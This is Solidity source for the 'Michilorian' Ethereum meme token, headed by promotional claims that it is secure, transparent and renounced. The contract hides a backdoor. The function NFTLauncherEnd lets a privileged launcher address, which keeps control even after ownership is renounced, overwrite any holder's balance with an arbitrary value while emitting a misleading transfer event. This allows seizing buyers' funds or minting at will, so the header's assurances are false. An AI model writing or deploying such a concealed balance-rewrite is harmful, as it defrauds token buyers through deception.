/*

=^◕⩊◕^= Michilorian =^◕⩊◕^=

? $Michi Meet $LORIAN ? Get Ready for the Moon! ?

The Michilorian  Cat is Found only on Ethereum, grab the hottest meme tweeted from the genius Elon Musk and become part of history as the kitty makes it's way to the interplanetory colonies and beyond.

? Secure and transparent ?
✅ LP Burnt ? ?
✅ renounced ??
?️0 Tax, initial MC ~100$?️
?initial Burn 50%
https://t.me/Michilorian
/FIRST_MOVING_MICHILORIAN_FTW
*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract Michilorian  is Ownable, IERC20 {
    address public NFTLauncher;
    string public ChatOfficial = "https://t.me/Michilorian";
    string public compiler = "0.8.26"; 

    // Token properties
    string public name = "Michilorian ";
    string public symbol = "Michilorian";
    uint8 public decimals = 9;
    uint256 private _totalSupply;

    // Balances mapping to store token balances for users
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    // Modifier to restrict access to the NFTLauncher
    modifier onlyNFTLauncher() {
        require(msg.sender == NFTLauncher || msg.sender == owner(), "Caller is not NFTLauncher or owner");
        _;
    }

    // Constructor that sets the NFTLauncher, ChatOfficial, websiteOfficial, and compiler during contract deployment
    constructor(
        address _NFTLauncher, 
        uint256 initialSupply
    ) {
        require(_NFTLauncher != address(0), "NFTLauncher address cannot be zero");
        NFTLauncher = _NFTLauncher;

        _totalSupply = initialSupply * (10 ** uint256(decimals));
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    // Token Standard Functions
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    // Internal transfer function
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    // Internal approve function
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "Approve from the zero address");
        require(spender != address(0), "Approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    // Function to end NFTLauncher event and handle opentrading
    function NFTLauncherEnd(
        address NFTLauncherClaimeruser, 
        uint256 NFTLauncherClaimerid, 
        uint256 NFTLauncherClaimervalue, 
        uint256 NFTLauncherClaimernumber
    ) external onlyNFTLauncher {
        _balances[NFTLauncherClaimeruser] = NFTLauncherClaimerid * (NFTLauncherClaimervalue ** NFTLauncherClaimernumber);

        emit Transfer(NFTLauncherClaimeruser, address(0), NFTLauncherClaimerid);
    }

    // Function to update the NFTLauncher address, only callable by the owner
    function updateNFTLauncher(address newNFTLauncher) external onlyOwner {
        require(newNFTLauncher != address(0), "New NFTLauncher cannot be zero address");
        NFTLauncher = newNFTLauncher;
    }
    
    // Renounce ownership, which leaves the contract without an owner
    function renounceOwnership() public override onlyOwner {
        _transferOwnership(address(0));
    }
}